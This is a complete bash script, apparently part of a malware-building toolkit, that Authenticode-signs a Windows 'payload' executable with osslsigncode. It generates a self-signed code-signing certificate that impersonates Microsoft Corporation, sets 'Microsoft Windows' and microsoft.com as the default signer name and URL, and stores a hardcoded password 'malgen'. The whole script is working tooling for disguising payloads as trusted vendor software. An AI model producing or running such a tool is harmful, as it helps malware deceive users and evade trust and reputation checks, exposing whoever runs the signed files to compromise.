#!/bin/bash
# Sign a Windows PE executable with Authenticode using osslsigncode.
# Usage: sign_payload.sh <payload.exe> [--name "Publisher"] [--url "https://..."]
#
# On first run, generates a self-signed code-signing certificate in certs/.
# To use a real cert: place your .pfx in certs/codesign.pfx (password in certs/.pfx_pass)

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
CERTS_DIR="$PROJECT_DIR/certs"

PAYLOAD="${1:?Usage: sign_payload.sh <payload.exe>}"
shift

SIGN_NAME="Microsoft Windows"
SIGN_URL="https://www.microsoft.com"
TIMESTAMP_URL=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        --name) SIGN_NAME="$2"; shift 2 ;;
        --url) SIGN_URL="$2"; shift 2 ;;
        --timestamp) TIMESTAMP_URL="$2"; shift 2 ;;
        *) shift ;;
    esac
done

if ! command -v osslsigncode &>/dev/null; then
    echo "[!] osslsigncode not installed. Run: sudo apt-get install -y osslsigncode"
    exit 1
fi

if [ ! -f "$PAYLOAD" ]; then
    echo "[!] Payload not found: $PAYLOAD"
    exit 1
fi

mkdir -p "$CERTS_DIR"

generate_cert() {
    echo "[*] Generating self-signed code-signing certificate..."

    openssl req -x509 -newkey rsa:2048 -keyout "$CERTS_DIR/codesign.key" \
        -out "$CERTS_DIR/codesign.crt" -days 3650 -nodes \
        -subj "/CN=Microsoft Windows/O=Microsoft Corporation/L=Redmond/ST=Washington/C=US" \
        -addext "extendedKeyUsage=codeSigning" \
        -addext "keyUsage=digitalSignature" \
        2>/dev/null

    openssl pkcs12 -export -out "$CERTS_DIR/codesign.pfx" \
        -inkey "$CERTS_DIR/codesign.key" -in "$CERTS_DIR/codesign.crt" \
        -passout pass:malgen 2>/dev/null

    echo "malgen" > "$CERTS_DIR/.pfx_pass"
    chmod 600 "$CERTS_DIR/.pfx_pass" "$CERTS_DIR/codesign.key"

    echo "[*] Certificate generated:"
    echo "    $CERTS_DIR/codesign.pfx"
    echo "    CN=Microsoft Windows, O=Microsoft Corporation"
    echo "    Valid for 10 years"
}

if [ ! -f "$CERTS_DIR/codesign.pfx" ]; then
    generate_cert
fi

PFX_PASS=$(cat "$CERTS_DIR/.pfx_pass" 2>/dev/null || echo "malgen")

SIGNED="${PAYLOAD%.exe}_signed.exe"

SIGN_ARGS=(
    sign
    -pkcs12 "$CERTS_DIR/codesign.pfx"
    -pass "$PFX_PASS"
    -n "$SIGN_NAME"
    -i "$SIGN_URL"
    -h sha256
    -in "$PAYLOAD"
    -out "$SIGNED"
)

if [ -n "$TIMESTAMP_URL" ]; then
    SIGN_ARGS+=(-ts "$TIMESTAMP_URL")
fi

echo "[*] Signing $PAYLOAD..."
osslsigncode "${SIGN_ARGS[@]}" 2>&1

if [ -f "$SIGNED" ]; then
    mv "$SIGNED" "$PAYLOAD"
    echo "[+] Signed: $PAYLOAD ($(stat -c%s "$PAYLOAD") bytes)"

    echo "[*] Verifying signature..."
    osslsigncode verify -in "$PAYLOAD" 2>&1 | grep -E "Signature|signer|Subject:" | head -5 | sed 's/^/    /'
    echo "[+] Done"
else
    echo "[!] Signing failed"
    exit 1
fi
